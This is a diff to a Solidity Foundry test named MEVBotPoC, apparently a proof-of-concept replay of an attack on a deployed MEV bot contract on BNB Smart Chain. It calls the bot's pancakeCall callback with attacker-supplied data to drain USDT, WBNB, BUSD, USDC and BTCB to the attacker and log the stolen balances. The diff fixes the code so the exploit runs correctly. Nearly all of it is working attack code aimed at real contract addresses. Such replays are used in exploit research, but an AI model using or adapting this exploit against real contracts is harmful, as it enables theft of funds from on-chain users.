@@ -22,13 +22,15 @@ IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
 IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
 IERC20 constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
 IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
-IERC20 constant BTCB = IERC20(0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c);
+IERC20 constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
 IMEVBot constant mevBot = IMEVBot(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d);
 
-event log_named_decimal_uint(string name, uint256 balance, uint256 decimal);\
+event log_named_decimal_uint(string name, uint256 balance, uint256 decimal);
 
 
 contract MEVBotPoC is Test { // 模拟攻击
+    address internal _token0;
+    address internal _token1;
     function setUp() public {
         vm.createSelectFork("bsc", 21_297_409);
     }
@@ -52,19 +54,19 @@ contract MEVBotPoC is Test { // 模拟攻击
 
         // 调用5次 BSC-USD、WBNB、BUSD、USDC、BTCB
         (_token0, _token1) = (address(USDT), address(USDT));
-        mevBot.pancakeCall(address(this), USDTAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this))), bytes32(0), bytes32(0))));
+        mevBot.pancakeCall(address(this), USDTAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));
 
         (_token0, _token1) = (address(WBNB), address(WBNB));
-        mevBot.pancakeCall(address(this), WBNBAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this))), bytes32(0), bytes32(0))));
+        mevBot.pancakeCall(address(this), WBNBAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));
 
         (_token0, _token1) = (address(BUSD), address(BUSD));
-        mevBot.pancakeCall(address(this), BUSDAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this))), bytes32(0), bytes32(0))));
+        mevBot.pancakeCall(address(this), BUSDAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));
 
         (_token0, _token1) = (address(USDC), address(USDC));
-        mevBot.pancakeCall(address(this), BUSDAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this))), bytes32(0), bytes32(0))));
+        mevBot.pancakeCall(address(this), USDCAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));
         
         (_token0, _token1) = (address(BTCB), address(BTCB));
-        mevBot.pancakeCall(address(this), BUSDAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this))), bytes32(0), bytes32(0))));\
+        mevBot.pancakeCall(address(this), BTCBAmount, 0, abi.encodePacked(bytes32(uint256(uint160(address(this)))), bytes32(0), bytes32(0)));
 
         emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
         emit log_named_decimal_uint("[End] Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
